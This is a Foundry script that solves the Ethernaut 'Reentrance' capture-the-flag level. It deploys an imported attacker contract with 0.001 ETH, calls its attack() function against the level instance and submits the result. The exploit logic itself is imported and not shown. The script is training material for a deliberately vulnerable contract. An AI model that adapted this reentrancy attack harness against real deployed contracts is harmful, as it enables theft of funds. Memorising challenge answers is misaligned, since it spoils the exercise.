// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import "../../src/10-ReentranceAttacker.sol";

contract ReentranceSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x2a24869323C0B13Dff24E196Ba072dC790D52479;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        // NOTE Must send at least 0.001 ETH
        address challengeInstance = __createInstance(LEVEL_ADDRESS);

        // YOUR SOLUTION HERE
        ReentranceAttacker reentranceAttacker = new ReentranceAttacker{value: 0.001 ether}(challengeInstance);
        reentranceAttacker.attack();

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(10));
    }
}
